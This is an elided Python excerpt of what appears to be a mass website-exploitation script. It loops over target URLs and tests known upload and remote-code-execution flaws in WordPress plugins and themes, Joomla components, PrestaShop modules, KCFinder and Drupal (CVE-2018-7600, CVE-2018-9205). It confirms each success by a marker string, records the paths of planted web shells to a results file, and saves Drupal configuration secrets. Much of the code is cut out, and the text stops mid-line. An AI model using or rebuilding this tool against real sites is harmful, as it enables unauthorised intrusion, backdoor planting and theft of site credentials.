...
def ExploitS(url):
    try:
        ...
        if 'Raiz0WorM' in revgi.content:
            ...
            open ('Result/shell.txt', 'a').write(url + '/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/vuln.php?c=vuln.php' + '\n')
        else:
        ...
        if 'Raiz0WorM' in Adsget.content:
            ...
            open ('Result/shell.txt', 'a').write (url + '/wp-content/plugins/dzs-videogallery/upload/xo.php' + '\n')
        else:
        ...
        if 'Tyrag' in re2.content:
            print '[{}Target]: {} {}	       ====> {}{} purevision    {}{} Success Upload '.format (sb, sd, url, fc, fc,
                                                                                                  sb, fg)
            open('Result/shell.txt', 'a').write(url + '/error.php' + '\n')
        else:
        ...
        if 'Raiz0WorM' in sabog.content:
            ...
            open ('Result/shell.txt', 'a').write (url + '/wp-content/themes/clockstone/theme/functions/u3p.php' + '\n')
        else:
        ...
        if 'Raiz0WorM' in ok2.content:
            ...
            open ('Result/shell.txt', 'a').write (url + '/modules/fieldvmegamenu/uploads/Attacker.php' + '\n')
        else:
        ...
        if 'Raiz0WorM_Ye' in Tevorlib.content:
            print '[{}Target]: {} {}	       ====> {}{} Tevolution     {}{} Success upload  '.format (sb, sd, url, fc,
                                                                                                        fc, sb, fg)
            open ('Result/shell.txt', 'a').write (url + '/wp-content/themes/Directory/images/tmp/' + filenames + '\n')
        else:
        ...
        if 'Raiz0WorM' in ok2.content:
            ...
            open ('Result/shell.txt', 'a').write (url + '/modules/mod_simplefileuploadv1.3/elements/u3p.php' + '\n')
        else:
        ...
        if 'Raiz0WorM' in Reflexlib.content:
            print '[{}Target]: {} {}	       ====> {}{} Reflex Gallery     {}{} Success upload  '.format (sb, sd, url,
                                                                                                            fc, fc, sb,
                                                                                                            fg)
            open ('Result/shell.txt', 'a').write (url + '/wp-content/uploads/2018/01/' + filenames + '\n')
        else:
        ...
        if 'Raiz0WorM' in dickno.content:
            ...
            open ('Result/shell.txt', 'a').write (url + '/assets/ckeditor/kcfinder/upload/files/Attacker.php' + '\n' )
        else:
        ...
        if 'Raiz0WorM' in gitme.content:
            ...
            open ('Result/shell.txt', 'a').write(url + '/modules/Attacker.php' + '\n')
        else:
        ...
        if 'Raiz0WorM' in gitme.content:
            ...
            open ('Result/shell.txt', 'a').write(url + '/modules/homepageadvertise2/slides/raiz0.php' + '\n')
        else:
        ...
        if 'Raiz0WorM' in r2.content:
            ...
            open ('Result/shell.txt', 'a').write (url + '/media/' + str (filename) + '\n')
        else:
        ...
        if 'Raiz0WorM_Ye' in shell_jd.content:
            ...
            print '{}[Target]: {} {}    ====> {}{} com_jdownloads   {}{} Success Upload  '.format (sb, sd, url, fc,
                                                                                                   fc, sb, fg)
            open ('Result/shell.txt', 'a').write (url + '/images/jdownloads/screenshots/raiz0worm.php3.g?raiz0' + '\n')
        ...
        if 'izocin' in requests.get (url + '/u.php', headers=headers).text:
            print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-7600 RCE V8    {}{} Success upload  '.format (sb, sd,
                                                                                                                 ...
                                                                                                                 fc, fc,
                                                                                                                 sb, fg)
            open ('Result/shell.txt', 'a').write (url + '/u.php' + '\n')
            sys.exit ()
        else:
        ...
        if 'drupal_hash_salt' in ddrevlib.content:
            print '[{}Drupal]: {} {}	       ====> {}{} CVE-2018-9205     {}{} Success  '.format (sb, sd, url, fc, fc,
                                                                                                    sb, fg)
            open ('Result/Config.txt', 'a').write (
